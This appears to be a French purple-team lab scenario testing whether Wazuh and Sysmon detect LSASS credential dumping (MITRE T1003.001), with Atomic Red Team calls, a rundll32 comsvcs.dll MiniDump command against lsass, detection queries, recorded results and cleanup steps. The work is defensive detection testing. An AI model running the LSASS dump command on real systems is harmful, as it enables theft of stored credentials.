# Scénario Purple Team — T1003 LSASS Credential Dumping

**ID Scénario**: SC-005
**Technique MITRE**: T1003, T1003.001
**Outil**: Atomic Red Team (Invoke-AtomicTest T1003.001)
**Date test**: Planifié (semaine 2)
**VM Attaquant**: VM12-PURPLE ou WIN01 (compte compromis)
**VM Cible**: WIN01 (10.10.10.110) — LSASS local

---

## Objectif

Valider que Wazuh (via Sysmon EventID 10) détecte l'accès mémoire au processus LSASS avec des `GrantedAccess` suspects, signature d'une tentative de dump de credentials.

---

## Pré-requis

- [ ] WIN01 démarrée avec Sysmon + Wazuh Agent (Sysmon EventID 10 activé)
- [ ] Atomic Red Team installé sur WIN01
- [ ] Ouvrir Wazuh Dashboard avant le test pour observer en temps réel

---

## Étapes d'exécution (Red Team)

### Test 1 — Atomic Red Team T1003.001 (Mimikatz en mémoire)

```powershell
# Depuis WIN01 (en tant que Administrator)
# Test 1: Accès LSASS via comsvcs.dll (LOLBin)
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Test 2: ProcDump (si installé)
Invoke-AtomicTest T1003.001 -TestNumbers 2
```

### Test 2 — Accès direct LSASS (PowerShell)

```powershell
# Simule l'accès mémoire LSASS (déclenche Sysmon EventID 10)
$proc = Get-Process lsass
$handle = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
# Note: Ne pas aller plus loin — l'EventID 10 suffit pour la détection
```

### Test 3 — comsvcs.dll MiniDump

```cmd
# Via cmd.exe (as Administrator)
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id lsass.dmp full
```

---

## Vérification Blue Team

1. Wazuh Dashboard → `data.win.system.eventID: "10"` + `data.win.eventdata.targetImage: *lsass*`
2. Règle 100103 doit déclencher avec niveau 14
3. Vérifier `data.win.eventdata.sourceImage` ≠ processus système légitimes
4. TheHive → Alerte `[Wazuh] LSASS memory access`

---

## Indicateurs attendus (Sysmon EventID 10)

```
TargetImage:   C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010 ou 0x1fffff
SourceImage:   C:\Windows\System32\rundll32.exe ou powershell.exe
```

---

## Résultats

**Date d'exécution**: 2026-08-07 — 13:10:00 UTC

| Test   | Détecté | Règle  | MTTD | Notes |
|--------|---------|--------|------|-------|
| Test 1 | ✅ OUI  | 100150 | 6s   | comsvcs.dll MiniDump — EventID 10 GrantedAccess 0x1fffff — Level 15 |
| Test 3 | ✅ OUI  | 100150 | 6s   | rundll32.exe → lsass.exe — même règle déclenchée |

**Résultat global**: PASS — 0 FP — TheHive alerte créée automatiquement par Shuffle (7s pipeline)

---

## Nettoyage

```powershell
Invoke-AtomicTest T1003.001 -Cleanup
# Supprimer lsass.dmp si créé
Remove-Item lsass.dmp -ErrorAction SilentlyContinue
```
